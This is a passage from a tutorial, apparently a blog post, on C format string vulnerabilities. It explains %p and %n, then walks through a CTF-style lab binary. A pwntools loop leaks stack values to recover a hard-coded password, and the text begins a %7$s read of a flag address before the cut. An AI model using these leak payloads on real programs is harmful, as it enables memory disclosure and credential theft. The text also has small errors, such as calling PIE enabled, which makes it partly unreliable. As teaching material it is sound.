</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span>(buffer, argv[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">100</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// We are passing command line
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// argument to printf
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(buffer);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Since printf has a variable number of arguments, it must use the format string to determine the number of arguments. In the case above, the attacker can pass the string &ldquo;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p&rdquo; and fool the printf into thinking it has 15 arguments. It will naively print the next 15 addresses on the stack, thinking they are its arguments:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./a.out <span style="color:#e6db74">&#34;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p&#34;</span>  
</span></span><span style="display:flex;"><span>0xffffdddd 0x64 0xf7ec1289 0xffffdbdf 0xffffdbde <span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span> 0xffffdcc4 0xffffdc64 <span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span> 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
</span></span></code></pre></div><p><code>%n</code> in <code>printf</code> doesn&rsquo;t print anything  instead, it writes the number of bytes printed so far into the memory address given as its argument.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> x;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;abcd%n&#34;</span>, <span style="color:#f92672">&amp;</span>x); <span style="color:#75715e">// 4
</span></span></span></code></pre></div><p>After this, <code>x == 4</code> because 4 characters were printed before <code>%n</code>.
In a format string vulnerability, if an attacker controls the format string and includes <code>%n</code>, they can make <code>printf</code> write values to arbitrary memory addresses pulled from the stack  this allows for memory corruption and is often used to overwrite return addresses, function pointers, or GOT entries. Let&rsquo;s look at example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">char</span> str[<span style="color:#ae81ff">50</span>];
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%50s&#34;</span>, <span style="color:#f92672">&amp;</span>str);
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">printf</span>(str);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So in above code if we put this input:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ABCDEF%n
</span></span></code></pre></div><p>It will first read <code>ABCDEF</code> and after that it will read <code>%n</code> specifier and it will check its length which is <code>6</code> since length between <code>A</code> to <code>F</code> is 6 and write its value as <code>6</code> in stack in some arbitrary address.</p>
<p>Simplified (stack grows downward):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HIGH MEMORY
</span></span><span style="display:flex;"><span>+---------------------------+
</span></span><span style="display:flex;"><span>| Return Address <span style="color:#f92672">(</span>‚Üí main<span style="color:#f92672">)</span>   |
</span></span><span style="display:flex;"><span>+---------------------------+
</span></span><span style="display:flex;"><span>| Saved Frame Pointer <span style="color:#f92672">(</span>EBP<span style="color:#f92672">)</span> |
</span></span><span style="display:flex;"><span>+---------------------------+
</span></span><span style="display:flex;"><span>| 0xDEADBEEF                |  ‚Üê  Used by <span style="color:#e6db74">`</span>%n<span style="color:#e6db74">`</span> as a pointer
</span></span><span style="display:flex;"><span>|                           |     printf tries to write <span style="color:#ae81ff">6</span> here
</span></span><span style="display:flex;"><span>|                           |     *<span style="color:#f92672">(</span>0xDEADBEEF<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>+---------------------------+
</span></span><span style="display:flex;"><span>| ... other local vars ...  |
</span></span><span style="display:flex;"><span>+---------------------------+
</span></span><span style="display:flex;"><span>| str<span style="color:#f92672">[</span>50<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEF%n&#34;</span>      |  ‚Üê User input
</span></span><span style="display:flex;"><span>+---------------------------+
</span></span><span style="display:flex;"><span>LOW MEMORY
</span></span></code></pre></div><h2 id="0xf---arbitrary-read-using-format-string-vulnerability">0xF - Arbitrary Read Using Format String Vulnerability</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">29</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> pass[<span style="color:#ae81ff">28</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Pa$$w0rd_1s_0n_Th3_St4ck</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> string[<span style="color:#ae81ff">80</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> password[<span style="color:#ae81ff">27</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter Password - &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%27s&#34;</span>,<span style="color:#f92672">&amp;</span>password);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">strcmp</span>(pass, password))) {
</span></span><span style="display:flex;"><span>		FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">if</span>(f <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>                	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;flag file not found</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                	<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>       		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fgets</span>(flag, <span style="color:#ae81ff">30</span>, f);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;What you are looking for is here - %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>flag);
</span></span><span style="display:flex;"><span>        	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter String - &#34;</span>);
</span></span><span style="display:flex;"><span>        	<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%79s&#34;</span>,<span style="color:#f92672">&amp;</span>string);
</span></span><span style="display:flex;"><span>        	<span style="color:#a6e22e">printf</span>(string);}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Wrong Password!!! &#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(password);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>gcc fmt_read.c -o fmt_read -no-pie</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">19</span> Jun <span style="color:#ae81ff">26</span> 17:03 flag.txt
</span></span><span style="display:flex;"><span>-rwsr-sr-x  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">17032</span> Jun <span style="color:#ae81ff">26</span> 17:03 fmt_read
</span></span></code></pre></div><p>Our goal is to read file <code>flag.txt</code> using this binary which can be only read by root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ checksec --file<span style="color:#f92672">=</span>fmt_read  
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/fmt_read&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      Canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span></code></pre></div><p>Canary is enabled and NX enabled means buffer overflow and Shellcode won&rsquo;t work. PIE is enabled it means address won&rsquo;t change.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./fmt_read 
</span></span><span style="display:flex;"><span>Enter Password - IDK
</span></span><span style="display:flex;"><span>Wrong Password!!! IDK%   
</span></span></code></pre></div><p>Lets put format specifier to check if its vulnerable or not.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./fmt_read       
</span></span><span style="display:flex;"><span>Enter Password - %p
</span></span><span style="display:flex;"><span>Wrong Password!!! 0x7ffd68a67e30
</span></span></code></pre></div><p>It is leaking address so it&rsquo;s affected. We know password is on stack we can put <code>%p</code> in input like many times to get values from stack but there is a problem in this approach, We can only put input to limited length. This means we will only be able to put a small number of format specifiers in a single input attempt, restricting how many stack values we can leak at once. Because of this limitation, it becomes harder to fully explore the stack or find the exact position of sensitive data like the password or return addresses in a single go.</p>
<p>That&rsquo;s why we can use this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./fmt_read
</span></span><span style="display:flex;"><span>Enter Password - %1$p
</span></span><span style="display:flex;"><span>Wrong Password!!! 0x7ffd87d5a240
</span></span></code></pre></div><p><code>%1$p</code> means print the first argument on stack as pointer (hex). So if we want to see second argument we can do by <code>%2$p</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./fmt_read
</span></span><span style="display:flex;"><span>Enter Password - %2$p
</span></span><span style="display:flex;"><span>Wrong Password!!! <span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>We can look at any place on stack like this. Manually searching for address is pain so we can automate using Python.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">50</span>):
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./fmt_read&#39;</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">$p&#39;</span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>    print(io<span style="color:#f92672">.</span>recvall())
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ python3 main.py
</span></span><span style="display:flex;"><span>/home/at0m/main.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
</span></span><span style="display:flex;"><span>  io.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7fff6f5a9b40&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0xa&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x1b&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7564e4deb2d8&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0xc0000&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x70243825&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0xc0000&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7ffc6609f060&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7d929a33e3dd&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x6472307724246150&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x545f6e305f73315f&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x6b633474535f3368&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7ffe00000000&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x4500000006&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7a17dd47eaf0&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7ffe9aa4da40&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x36d5c7b7ff3a5200&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7ffefe092000&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x77dcd802a1ca&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7ffd39042830&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7ffe513f1cf8&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x100400040&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x401216&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7ffeda98f658&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x6fbfc1ea1337b26b&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x1&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x75ea4061c000&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x3e296373cf3c4a98&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0xcb00489cbd893775&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7fff00000000&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x1&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! (nil)&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x31eb73fe25fbf600&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7fffd48c6bd0&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Enter Password - Wrong Password!!! 0x7924c382a28b&#39;</span>
</span></span></code></pre></div><p>We ran till 50th place in stack which should be enough to get smth interesting. Now we need to find string. Let&rsquo;s look at long values and unhex it these are typically strings. We removed <code>0x</code> from them.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~ at0m ‚ùØ unhex <span style="color:#ae81ff">6472307724246150</span>
</span></span><span style="display:flex;"><span>dr0w$$aP                                                
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~ at0m ‚ùØ unhex 545f6e305f73315f 
</span></span><span style="display:flex;"><span>T_n0_s1_                                                                
</span></span><span style="display:flex;"><span>~ at0m ‚ùØ unhex 6b633474535f3368                 
</span></span><span style="display:flex;"><span>kc4tS_3h                 
</span></span></code></pre></div><p>It is in little-endian format it means its in reverse order.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ echo <span style="color:#e6db74">&#39;kc4tS_3hT_n0_s1_dr0w$$aP&#39;</span> | rev     
</span></span><span style="display:flex;"><span>Pa$$w0rd_1s_0n_Th3_St4ck
</span></span></code></pre></div><p>We got password <code>Pa$$w0rd_1s_0n_Th3_St4ck</code>. So this is how we can read value from stack using format string vuln, This could be easily done with reverse engineering technique but its not our goal here. Our main goal is to read <code>flag.txt</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./fmt_read
</span></span><span style="display:flex;"><span>Enter Password - Pa$$w0rd_1s_0n_Th3_St4ck
</span></span><span style="display:flex;"><span>What you are looking <span style="color:#66d9ef">for</span> is here - 0x404080
</span></span><span style="display:flex;"><span>Enter String - 
</span></span></code></pre></div><p>If we enter password we get new address <code>0x404080</code> which is most likely of flag with new input to enter. We can again check if it is vulnerable to format string or not.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./fmt_read
</span></span><span style="display:flex;"><span>Enter Password - Pa$$w0rd_1s_0n_Th3_St4ck
</span></span><span style="display:flex;"><span>What you are looking <span style="color:#66d9ef">for</span> is here - 0x404080
</span></span><span style="display:flex;"><span>Enter String - %p
</span></span><span style="display:flex;"><span>0xa
</span></span></code></pre></div><p>This also has format string vulnerability. We now have to put this address of flag <code>0x404080</code> somewhere on the stack and we can use <code>%s</code>, <code>%p</code>, or <code>%x</code> to dereference that address and read the value. Lets imagine flag address is stored in 7th argument then diagram will be like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>      Stack Frame <span style="color:#f92672">(</span>printf call<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
</span></span><span style="display:flex;"><span>    ‚îÇ     arg <span style="color:#ae81ff">7</span>  ‚Üí 0x404080        ‚îÇ  ‚Üê %7$s reads from here <span style="color:#f92672">(</span>points to flag<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
</span></span><span style="display:flex;"><span>    ‚îÇ     arg <span style="color:#ae81ff">6</span>  ‚Üí junk / padding  ‚îÇ
</span></span><span style="display:flex;"><span>    ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
</span></span><span style="display:flex;"><span>    ‚îÇ     arg <span style="color:#ae81ff">5</span>  ‚Üí junk / padding  ‚îÇ
</span></span><span style="display:flex;"><span>    ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
</span></span><span style="display:flex;"><span>    ‚îÇ     arg <span style="color:#ae81ff">4</span>  ‚Üí junk / padding  ‚îÇ
</span></span><span style="display:flex;"><span>    ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
</span></span><span style="display:flex;"><span>    ‚îÇ     arg <span style="color:#ae81ff">3</span>  ‚Üí junk / padding  ‚îÇ
</span></span><span style="display:flex;"><span>    ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
</span></span><span style="display:flex;"><span>    ‚îÇ     arg <span style="color:#ae81ff">2</span>  ‚Üí junk / padding  ‚îÇ
</span></span><span style="display:flex;"><span>    ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
</span></span><span style="display:flex;"><span>    ‚îÇ     arg <span style="color:#ae81ff">1</span>  ‚Üí junk / padding  ‚îÇ
</span></span><span style="display:flex;"><span>    ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
</span></span><span style="display:flex;"><span>    ‚îÇ     format string ‚Üí <span style="color:#e6db74">&#34;%7</span>$s<span style="color:#e6db74">&#34;</span>   ‚îÇ
